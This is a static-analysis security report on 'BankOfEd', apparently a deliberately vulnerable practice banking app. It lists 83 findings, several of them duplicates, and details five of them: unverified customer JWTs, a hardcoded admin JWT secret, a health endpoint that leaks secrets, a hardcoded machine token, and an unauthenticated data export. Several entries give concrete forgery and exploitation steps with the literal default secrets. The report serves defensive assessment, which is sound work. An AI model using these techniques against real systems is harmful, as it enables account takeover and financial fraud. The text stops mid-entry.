# SAST Report: SAST – BankOfEd-main.zip

- Exported: 27/9/2026, 12:10:20 pm
- Total issues: 83

## Issue Summary

| # | Severity | Candidate | Confidence | Validation | Reportable | Location |
|---:|---|---|---:|---|---|---|
| 1 | HIGH | Customer JWT signatures are never verified | 98% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50 |
| 2 | HIGH | Hardcoded admin JWT secret allows forging admin tokens | 93% | confirmed | Yes | BankOfEd-main/config/admin.php:21 |
| 3 | HIGH | Unauthenticated /api/health leaks JWT secret and DB identity | 95% | confirmed | Yes | BankOfEd-main/src/Router.php:23 |
| 4 | HIGH | Hardcoded machine token authenticates payment APIs | 96% | confirmed | Yes | BankOfEd-main/src/Models/MachineToken.php:22 |
| 5 | HIGH | Unauthenticated admin export dumps all banking data | 98% | confirmed | Yes | BankOfEd-main/src/AdminRouter.php:48 |
| 6 | HIGH | Profile update accepts attacker-controlled user_id (IDOR) | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:52 |
| 7 | MEDIUM | Transaction show has no ownership check | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:40 |
| 8 | MEDIUM | Hardcoded insurance SSO HMAC secret | 78% | confirmed | Yes | BankOfEd-main/config/app.php:33 |
| 9 | MEDIUM | User API responses include password_hash and totp_secret | 96% | confirmed | Yes | BankOfEd-main/src/Models/User.php:69 |
| 10 | HIGH | Unauthenticated /api/health leaks JWT secret and database credentials | 96% | confirmed | Yes | BankOfEd-main/src/Router.php:33 |
| 11 | HIGH | JWT authentication accepts unsigned/forged tokens | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:53 |
| 12 | HIGH | Profile update IDOR via user_id allows mutating other customers | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:54 |
| 13 | MEDIUM | Transaction detail endpoint lacks ownership check | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:41 |
| 14 | HIGH | External transfer IDOR lets any user debit another customer's account | 97% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:175 |
| 15 | HIGH | Unauthenticated admin export dumps all users, accounts, and transactions | 99% | confirmed | Yes | BankOfEd-main/src/AdminRouter.php:48 |
| 16 | HIGH | Auth and profile APIs return password hashes and TOTP secrets | 97% | confirmed | Yes | BankOfEd-main/src/Models/User.php:82 |
| 17 | HIGH | Login issues JWT without verifying TOTP even when 2FA is enabled | 90% | confirmed | Yes | BankOfEd-main/src/Controllers/AuthController.php:70 |
| 18 | HIGH | Hardcoded machine token fallback authenticates payment APIs | 93% | confirmed | Yes | BankOfEd-main/src/Models/MachineToken.php:24 |
| 19 | HIGH | Unauthenticated /api/health leaks JWT secret and database credentials | 95% | confirmed | Yes | BankOfEd-main/src/Router.php:25 |
| 20 | HIGH | Customer JWT signatures are never verified | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50 |
| 21 | HIGH | External transfers debit any source account without ownership check | 97% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:174 |
| 22 | HIGH | External transfers skip balance checks allowing unlimited overdraft | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:212 |
| 23 | HIGH | TOTP step-up on external transfers can be skipped | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:234 |
| 24 | HIGH | GET /api/transactions/{id} returns any customer's transaction | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:41 |
| 25 | MEDIUM | Stored XSS in admin customer Delete handler via HTML-entity decoding | 92% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:107 |
| 26 | HIGH | Stored XSS in admin accounts table via account_name onclick | 93% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/accounts.js:54 |
| 27 | HIGH | Stored XSS in admin customer detail via name in Delete onclick | 95% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:161 |
| 28 | MEDIUM | DOM XSS via unsanitized avatar_data in sidebar innerHTML | 86% | confirmed | Yes | BankOfEd-main/public/banking/js/app.js:72 |
| 29 | HIGH | Stored XSS via unescaped transaction description on account detail | 93% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:171 |
| 30 | MEDIUM | Stored XSS via unescaped transaction description on dashboard | 90% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:98 |
| 31 | HIGH | Unauthenticated admin export dumps all users, hashes, and transactions | 97% | confirmed | Yes | BankOfEd-main/src/AdminRouter.php:48 |
| 32 | HIGH | JWT decoder ignores signatures, allowing authentication bypass | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:54 |
| 33 | HIGH | SQL injection in admin customer search | 93% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:28 |
| 34 | HIGH | Unauthenticated admin export dumps all users, accounts, and transactions | 98% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:174 |
| 35 | HIGH | SQL injection in admin customer listing fetch query | 93% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:33 |
| 36 | HIGH | Unauthenticated export dumps all users, accounts, cards, and transactions | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:174 |
| 37 | HIGH | SSRF: avatar proxy fetches attacker-controlled URL and returns the body | 93% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:79 |
| 38 | HIGH | IDOR: profile update accepts arbitrary user_id | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:54 |
| 39 | HIGH | Profile and auth responses leak password_hash and totp_secret | 95% | confirmed | Yes | BankOfEd-main/src/Models/User.php:82 |
| 40 | HIGH | SQL injection in admin customer search | 93% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:23 |
| 41 | HIGH | SQL injection via unsanitized transaction sort column | 96% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:43 |
| 42 | MEDIUM | IDOR: any customer can read another user's transaction by ID | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:40 |
| 43 | HIGH | IDOR: external transfer debits any account by ID | 96% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:175 |
| 44 | HIGH | TOTP required for external transfers can be skipped by omitting the code | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:237 |
| 45 | MEDIUM | Card payments skip CVV verification when the field is omitted | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/PaymentController.php:85 |
| 46 | HIGH | Payments transfer API does not authenticate the source account holder | 86% | dismissed | No | BankOfEd-main/src/Controllers/PaymentController.php:180 |
| 47 | HIGH | Unauthenticated /api/health discloses JWT secret and database credentials | 98% | confirmed | Yes | BankOfEd-main/src/Router.php:32 |
| 48 | HIGH | SQL injection via unsanitized sort parameter in transaction listing | 95% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:47 |
| 49 | HIGH | BOLA: any authenticated user can read another user's transaction by ID | 97% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:13 |
| 50 | HIGH | Hardcoded machine-token fallback always authenticates payment APIs | 93% | confirmed | Yes | BankOfEd-main/src/Models/MachineToken.php:26 |
| 51 | HIGH | SQL injection via sort in unfiltered transaction query branch | 97% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:62 |
| 52 | HIGH | SQL injection via unsanitized ORDER BY sort parameter | 96% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:44 |
| 53 | HIGH | User API responses leak password hashes and TOTP secrets | 96% | confirmed | Yes | BankOfEd-main/src/Models/User.php:83 |
| 54 | HIGH | IDOR allows updating and reading another user's profile | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:56 |
| 55 | HIGH | Unsalted MD5 used for password hashing and verification | 95% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:24 |
| 56 | HIGH | JWT decoded without signature verification enabling auth bypass | 98% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:58 |
| 57 | HIGH | External transfer IDOR drains any customer's source account | 98% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:174 |
| 58 | HIGH | External transfers skip TOTP even when 2FA is required | 96% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:241 |
| 59 | HIGH | External transfers have no source-balance check | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:212 |
| 60 | HIGH | IDOR: any user can debit another customer's account via external transfer | 97% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:95 |
| 61 | HIGH | External transfers debit accounts with no available-balance check | 96% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:95 |
| 62 | HIGH | Self-service credit-card limit and loan amount have no upper bound | 88% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:75 |
| 63 | MEDIUM | Full PAN and CVV stored in plaintext and returned by account APIs | 93% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:75 |
| 64 | HIGH | Card payment API accepts charges without CVV | 95% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:64 |
| 65 | HIGH | Unauthenticated /api/health leaks JWT secret and database credentials — Health route is explicitly registered with auth => false. | 95% | confirmed | Yes | BankOfEd-main/src/Router.php:25 |
| 66 | HIGH | Customer JWT signatures are never verified — AuthMiddleware treats the unverified payload sub as the authenticated user id. | 98% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50 |
| 67 | HIGH | External transfers debit any source account without ownership check — Balance is then updated on that unscope-checked account id. | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:174 |
| 68 | HIGH | TOTP step-up on external transfers can be skipped — Users without TOTP enrolled are allowed to complete high-risk external transfers | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:234 |
| 69 | MEDIUM | Stored XSS in admin customer Delete handler via HTML-entity decoding — Registration and profile update accept arbitrary first_name/last_name with no sa | 93% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:107 |
| 70 | HIGH | Stored XSS in admin accounts table via account_name onclick — POST /api/accounts stores account_name with only required\|string\|max:100 and no | 93% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/accounts.js:54 |
| 71 | HIGH | Stored XSS in admin customer detail via name in Delete onclick — POST /api/auth/register stores first_name and last_name with only length checks | 95% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:161 |
| 72 | MEDIUM | DOM XSS via unsanitized avatar_data in sidebar innerHTML — Server copies unsanitized remote Content-Type into avatar_data data URI | 90% | confirmed | Yes | BankOfEd-main/public/banking/js/app.js:72 |
| 73 | HIGH | Stored XSS via unescaped transaction description on account detail — API/transfer layer persists description/payee_name/reference with no HTML saniti | 94% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:171 |
| 74 | MEDIUM | Stored XSS via unescaped transaction description on dashboard — Transfer and payment APIs persist attacker-supplied description/payee/reference | 90% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:98 |
| 75 | HIGH | Unauthenticated export dumps all users, accounts, cards, and transactions — exportAll() uses SELECT * and returns password hashes, TOTP secrets, full PAN/CV | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:174 |
| 76 | HIGH | SSRF: avatar proxy fetches attacker-controlled URL and returns the body — Fetched response body is returned to the attacker as base64, turning SSRF into a | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:79 |
| 77 | HIGH | IDOR: external transfer debits any account by ID — No remaining-balance check on the external transfer path | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:175 |
| 78 | HIGH | Payments transfer API does not authenticate the source account holder — Allowlist only applies to two token names and includes hardcoded user_id 16 | 88% | dismissed | No | BankOfEd-main/src/Controllers/PaymentController.php:180 |
| 79 | HIGH | External transfers debit accounts with no available-balance check — transferOwn only enforces balance for account_type in [transaction, fx], allowin | 91% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:95 |
| 80 | HIGH | External transfers debit accounts with no available-balance check — updateBalance has no floor/constraint, so application-level checks are the only | 95% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:95 |
| 81 | HIGH | Self-service credit-card limit and loan amount have no upper bound — loan borrow_amount is validated only as decimal:2 > 0 with no maximum before upd | 93% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:75 |
| 82 | MEDIUM | Full PAN and CVV stored in plaintext and returned by account APIs — Account::toPublic returns full card_number, card_expiry, and card_cvv to the cli | 91% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:75 |
| 83 | HIGH | Card payment API accepts charges without CVV — Payment process validator does not require cvv | 95% | confirmed | Yes | BankOfEd-main/src/Models/Account.php:64 |

## 1. Customer JWT signatures are never verified

- Lead reference: ENCX-001
- Category: A01
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50
- Fingerprint: 765dc44ea31a774611f953ba40e620575b15bbf4325811dcb9d0dea1f3ae4f6e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 13,
  "symbol": "handle",
  "input": "HTTP_AUTHORIZATION Bearer token"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer token (attacker supplies a forged three-part JWT)",
  "decodeToken checks payload.exp is in the future (attacker sets a future unix timestamp)",
  "AuthMiddleware rejects revoked jti values (attacker uses a fresh unused jti)",
  "sub must map to an existing user (seeded users start at id 1; User::findById succeeds)",
  "AdminAuthMiddleware uses JWT::decode with jwt_secret (does not protect the customer AuthMiddleware path)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 50,
  "symbol": "decodeToken",
  "operation": "jwt_decode_without_signature"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Not dynamically executed against a running instance; confirmation is from a complete static source-to-sink read of decodeToken, AuthMiddleware, Router, User::findById, and AccountController."
]
```

#### Attack path

```
{
  "nodes": [
    "Internet client → public/index.php → Router::dispatch on any customer route with auth => true (e.g. GET /api/accounts)",
    "AuthMiddleware::handle reads attacker-supplied Authorization: Bearer token (no TLS client identity; CORS origin *)",
    "AuthService::decodeToken splits the three JWT parts, base64url-decodes the payload, and returns it if exp is in the future — HS256 signature and jwt_secret are never consulted",
    "AuthMiddleware rejects only revoked jti and missing User::findById(payload.sub); attacker uses a fresh jti and seeded sub=1",
    "Controller (AccountController, TransferService, ProfileController, InsuranceController, …) executes with the forged user identity"
  ],
  "impact": "Full customer-account takeover without credentials: list/create accounts, move funds, change profile/email, read transactions, and launch insurance SSO as any existing user (seeded ids start at 1). Rotating JWT_SECRET does not mitigate because verification never uses it.",
  "severity_reasoning": "High: an unauthenticated internet caller can impersonate any customer on every auth=>true banking API. The only checks (three-part JWT, future exp, unused jti, existing sub) are fully attacker-controlled. This is a complete break of the customer authentication boundary.",
  "dynamic_test": "Mint a three-part JWT whose payload is {\"sub\":1,\"jti\":\"<unique>\",\"exp\":<now+3600>} with an arbitrary header and signature segment. GET /api/accounts with Authorization: Bearer <token> and confirm HTTP 200 with user 1 (Amelia Chen) accounts (bsb 062-001 / 10000001) rather than 401. Repeat against POST /api/transfers/external to show the same identity is accepted for money movement. Do not treat a 401 as a pass."
}
```

#### Validator reasoning

AuthService::decodeToken() never verifies the HS256 signature. It splits the JWT on '.', base64url-decodes parts[1], json_decodes the payload, and returns it if exp exists and is in the future. The signature segment is discarded. Firebase JWT is imported and used for JWT::encode in createToken, but JWT::decode is never called on the customer path (unlike AdminAuthMiddleware, which does verify HMAC). AuthMiddleware::handle() is the only gate for every `'auth' => true` customer route in Router.php; it takes the attacker-controlled Bearer token, calls decodeToken, then User::findById($payload->sub) and returns that user to controllers. GET /api/accounts, PUT /api/profile, POST /api/transfers/external, address-book, insurance SSO, etc. all consume this identity with no later signature check. An attacker can mint header.payload.anything with sub set to a seeded user id (install/seed.sql users start at 1), a unique jti, and a future exp, then impersonate that user. jwt_secret is unused on verification, so rotating JWT_SECRET does not mitigate this. The listed controls (Bearer presence, exp, revoked-jti lookup, existing sub) are all attacker-satisfiable and do not bind the token to the server secret.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        // Decode token payload without strict signature verification
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload;
    } catch (\Exception $e) {
        return null;
    }
}

// AuthMiddleware::handle()
$payload = AuthService::decodeToken($token);
...
$user = User::findById($payload->sub);
```

## 2. Hardcoded admin JWT secret allows forging admin tokens

- Lead reference: ENCX-002
- Category: A01
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:21
- Fingerprint: 40d625d1a835164c4496b9c5ad9e013736c7d260dcbe1e280541616584e562e5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/admin.php",
  "line": 21,
  "symbol": "jwt_secret",
  "input": "ADMIN_JWT_SECRET getenv fallback"
}
```

#### Controls encountered

```
[
  "AdminAuthMiddleware JWT::decode with HS256 and the configured secret",
  "Issuer must equal BankOfEdAdmin",
  "jti checked against admin_revoked_tokens",
  "payload.sub must match an existing admin_users row",
  "deploy.sh generates a random ADMIN_JWT_SECRET for Ubuntu/Debian production installs"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Middleware/AdminAuthMiddleware.php",
  "line": 27,
  "symbol": "handle",
  "operation": "jwt_decode_with_hardcoded_secret"
}
```

#### Counterevidence

```
[
  "deploy.sh writes a generated ADMIN_JWT_SECRET into .env on fresh Ubuntu/Debian installs, so that deployment path does not use the hardcoded fallback",
  "README documents this as a pentest/scanner practice app and publishes default admin/admin123, which independently yields the same admin APIs on the Docker demo"
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker obtains the default admin HMAC key from config/admin.php, .env.example (ADMIN_JWT_SECRET=bankofed-admin-secret-change-in-production), or the published repo; Docker/entrypoint never override it",
    "Attacker locally HS256-signs a JWT with iss=BankOfEdAdmin, sub=1 (seeded admin_users row), unique jti, future exp using that secret",
    "Internet client → public/index.php → AdminRouter::dispatch on any admin route with auth => true (PUT /api/admin/accounts/{id}/balance, POST /api/admin/system/reset, GET /api/admin/system/settings)",
    "AdminAuthMiddleware::handle calls Firebase JWT::decode with config/admin.php jwt_secret — verification succeeds against the well-known default",
    "Issuer check (BankOfEdAdmin), unused-jti lookup, and admin_users id=1 all pass; privileged handlers run as the seeded admin"
  ],
  "impact": "Forged admin session: arbitrary balance changes, full customer dumps via authenticated admin APIs, plaintext machine_token disclosure, and destructive database reset. Independent of the seeded admin/admin123 password path.",
  "severity_reasoning": "High: the production Docker image ships the well-known ADMIN_JWT_SECRET, and AdminAuthMiddleware actually verifies HS256 against it. Anyone with the repo can mint a valid admin token for sub=1 and reach every privileged admin sink.",
  "dynamic_test": "Using secret bankofed-admin-secret-change-in-production, encode HS256 JWT {iss:BankOfEdAdmin,sub:1,jti:unique,exp:now+3600}. Call GET /api/admin/system/settings and PUT /api/admin/accounts/1/balance with that Bearer token. Success (200 with machine_token / updated balance) confirms the default secret authenticates admin APIs; 401 would mean a non-default secret was deployed."
}
```

#### Validator reasoning

The hardcoded ADMIN_JWT_SECRET fallback is live production configuration, not dead code. config/admin.php:21 sets jwt_secret from getenv('ADMIN_JWT_SECRET') or the public default 'bankofed-admin-secret-change-in-production'. The advertised Docker path never overrides it: Dockerfile only ENV ADMIN_DB_USER=root, docker-entrypoint.sh never exports ADMIN_JWT_SECRET, and .dockerignore excludes .env so the image has no env file. getenv therefore returns false and the well-known HS256 secret is used.

Forgery is straightforward. AdminAuthController mints tokens with iss=BankOfEdAdmin, sub=<admin id>, a random jti, iat, and exp. AdminAuthMiddleware verifies with JWT::decode(token, new Key($config['jwt_secret'], 'HS256')), then only checks issuer == 'BankOfEdAdmin', that jti is not in admin_revoked_tokens, and that admin_users.id = payload.sub exists. An attacker who can read the repo (or .env.example, which repeats the same default) can mint a fresh HS256 JWT with iss=BankOfEdAdmin, sub=1, a new jti, and a future exp. install/admin_schema.sql and seed.sql insert the default admin user (AUTO_INCREMENT id=1). public/index.php routes /api/admin/* to AdminRouter, which applies this middleware to privileged endpoints including GET /api/admin/customers, PUT /api/admin/accounts/{id}/balance, DELETE /api/admin/customers/{id}, and POST /api/admin/system/reset.

None of the listed controls block this: issuer is a public constant, jti revocation only covers previously logged-out tokens, and the seeded admin row satisfies the user-existence check. deploy.sh does generate a random ADMIN_JWT_SECRET for Ubuntu/Debian installs, so that one path is not vulnerable — but Docker, .env.example, and any install that leaves the env unset still are. Seeded admin/admin123 is an independent login path, not a control against token forgery; forging still works after a password change if the JWT secret is left at the default.

#### Code evidence

```
'jwt_secret'    => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production',

// AdminAuthController::login
$token = JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm']);

// AdminAuthMiddleware::handle
$payload = JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm']));
if (($payload->iss ?? '') !== 'BankOfEdAdmin') { ... }
```

## 3. Unauthenticated /api/health leaks JWT secret and DB identity

- Lead reference: ENCX-003
- Category: A01
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:23
- Fingerprint: bf2c72ae64a234f13b69ccbb029ad1b5f07451aebaa7f6bb9051f9f37dc26829

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 23,
  "symbol": "jwt_secret",
  "input": "JWT_SECRET getenv fallback"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 32,
  "symbol": "health",
  "operation": "unauthenticated_secret_disclosure"
}
```

#### Counterevidence

```
[
  "AuthService::decodeToken explicitly decodes the JWT payload without verifying the HMAC, so the leaked customer jwt_secret is not currently required to forge customer Bearer tokens.",
  "db_pass is not included in the health payload; Docker/default db_host is 127.0.0.1 so the leaked DB identity is more useful for local/same-host targeting than remote.",
  "Admin JWT uses ADMIN_JWT_SECRET from config/admin.php and is not returned by this endpoint."
]
```

#### Proof gaps

```
[
  "No live HTTP response was captured in this review; confirmation is from the deterministic PHP path (route table + handler + Response::success)."
]
```

#### Attack path

```
{
  "nodes": [
    "Internet client → public/index.php → Router::dispatch GET /api/health",
    "Route is registered with auth => false, so AuthMiddleware is skipped",
    "Router::health() requires config/app.php and copies jwt_secret, db_host, db_name, db_user into the payload (Docker leaves JWT_SECRET unset, so default bankofed-dev-secret-change-in-production is used)",
    "Response::success JSON-echoes those secrets to the unauthenticated caller"
  ],
  "impact": "Disclosure of the live customer JWT HMAC key plus database host/name/user. Combined with AuthService::createToken this is the key needed to forge customer JWTs if signature verification were enabled; it also gives targeting data for the database.",
  "severity_reasoning": "High: a single unauthenticated GET returns the production HMAC secret and DB identity. No auth, no redaction. In the shipped Docker image the leaked value is the well-known default.",
  "dynamic_test": "GET /api/health with no Authorization header. Confirm HTTP 200 JSON includes data.jwt_secret (default bankofed-dev-secret-change-in-production when JWT_SECRET is unset), data.db_host, data.db_name, and data.db_user. Absence of jwt_secret would contradict the static finding."
}
```

#### Validator reasoning

Confirmed source-to-sink information disclosure. GET /api/health is registered in Router::dispatch() with auth => false, so AuthMiddleware is never invoked. public/index.php forwards every /api/* request into that dispatcher (after CORS, which reflects any Origin). Router::health() requires config/app.php and passes jwt_secret, db_host, db_name, and db_user into Response::success(), which json_encodes the array and exits. jwt_secret is getenv('JWT_SECRET') with hardcoded fallback 'bankofed-dev-secret-change-in-production'. Dockerfile and docker-entrypoint.sh never set JWT_SECRET, so the Docker image leaks that default; deploy.sh-generated .env values are leaked equally because health() returns the live config. AuthService::createToken HMAC-signs customer JWTs with the same secret (HS256). No IP allowlist, debug flag, or env gate exists. Customer decodeToken currently skips signature verification, so forging customer tokens does not presently require this key, but that does not block the disclosure itself: any unauthenticated client can retrieve the live HMAC secret and DB identity in one GET.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}

$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 4. Hardcoded machine token authenticates payment APIs

- Lead reference: ENCX-004
- Category: A01
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/MachineToken.php:22
- Fingerprint: 4f7534bb48974dd79fee3b963cebdd0fc8bc4c2af619ca9cd6e3759bdee6017a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 35,
  "symbol": "machine_token",
  "input": "MACHINE_TOKEN getenv fallback"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware requires a Bearer token and rejects non-matching values",
  "PaymentController::transfer() restricts configured_machine_token/face_insurance to FACE Insurance merchant account or user_id 16"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/MachineToken.php",
  "line": 25,
  "symbol": "validateToken",
  "operation": "machine_token_fallback_compare"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No live HTTP request was executed; confirmation is from source, seed, Docker, routes, middleware, and unit test that asserts this token validates."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker reads config/app.php / repo default machine_token mch_face_insurance_secret_key_2026 (Docker does not set MACHINE_TOKEN)",
    "Internet client → Router::dispatch POST /api/payments/process or POST /api/payments/transfer (auth => 'machine')",
    "MachineAuthMiddleware::handle extracts Bearer token and calls MachineToken::validateToken",
    "validateToken hashes and looks up machine_tokens; on miss it string-compares the raw Bearer to the configured fallback and returns a synthetic row name=configured_machine_token",
    "PaymentController::process charges any Luhn-valid card to a merchant; PaymentController::transfer treats configured_machine_token as authorized for FACE Insurance merchant account and user_id 16. Admin GET /api/admin/system/settings also returns the same plaintext token."
  ],
  "impact": "Unauthenticated machine-API access: charge customer credit cards (PAN+expiry) and originate transfers from the FACE Insurance merchant / user 16 accounts using a public shared secret.",
  "severity_reasoning": "High: the payment APIs are gated only by this token, the fallback is hardcoded and always accepted even with an empty machine_tokens table, and the Docker image never overrides MACHINE_TOKEN.",
  "dynamic_test": "POST /api/payments/process with Authorization: Bearer mch_face_insurance_secret_key_2026 and a JSON body containing a seeded credit-card PAN, expiry, merchant_id, and amount. Confirm 200 success / receipt rather than 401. Independently GET /api/admin/system/settings with an admin token and confirm data.machine_token equals the same string."
}
```

#### Validator reasoning

The public string mch_face_insurance_secret_key_2026 is a live machine credential with a complete source-to-sink path into money-moving APIs. config/app.php:35 defaults machine_token to that string when MACHINE_TOKEN is unset. MachineToken::validateToken first SHA-256-looks up the Bearer token in machine_tokens; install/seed.sql inserts SHA2 of the same public string as the active face_insurance row. If that lookup misses, lines 22–31 still accept a plaintext compare against the config value (with a second hardcoded fallback of the same string) and return a synthetic configured_machine_token identity. Docker, docker-entrypoint.sh, and .env.example never set MACHINE_TOKEN, so the published image uses the default. Tests treat this string as a valid token.

Router registers POST /api/payments/process and POST /api/payments/transfer with auth => machine. MachineAuthMiddleware is the only gate: a matching Bearer token is sufficient. process() never consults $auth, so this credential can charge any in-DB credit card (Luhn + expiry; CVV is skipped when omitted) to any merchant. transfer() explicitly allowlists configured_machine_token and face_insurance for the FACE Insurance merchant account (seeded id 100, BSB 062-001 / 88880001, user_id 16, balance 100000000.00) and any other account owned by user 16, then performs an atomic debit/credit. Bearer-required middleware is not a control against a public default; the transfer allowlist authorizes rather than blocks this identity. Admin GET /api/admin/system/settings additionally returns the plaintext token to any admin session, and the admin SPA hardcodes the same value. Changing MACHINE_TOKEN would not revoke the seeded hash of the original string.

#### Code evidence

```
'machine_token'        => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026',

// MachineToken::validateToken
$fallbackToken = $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026';
if ($rawToken === $fallbackToken) {
    return [
        'id' => 0,
        'name' => 'configured_machine_token',
        'is_active' => 1,
    ];
}

// AdminSystemController::getSettings
'machine_token'     => $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026',
```

## 5. Unauthenticated admin export dumps all banking data

- Lead reference: ENCX-005
- Category: A01
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/AdminRouter.php:48
- Fingerprint: d06aae8c22242c5424e498c5746e8f7eeec4af2b987da9060adb5c5aeb666169

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 48,
  "symbol": "export/users",
  "input": "unauthenticated GET"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 163,
  "symbol": "exportAll",
  "operation": "unauthenticated_data_export"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Internet client → public/index.php → AdminRouter::dispatch GET /api/admin/export/users",
    "Route is registered with auth => false, so AdminAuthMiddleware never runs",
    "AdminUserController::exportAll() executes SELECT * FROM users, accounts, and transactions via AdminDatabase",
    "Response::success returns the raw rows (password_hash, totp_secret, balances, card_number/expiry/cvv if present, full transfer history) as JSON"
  ],
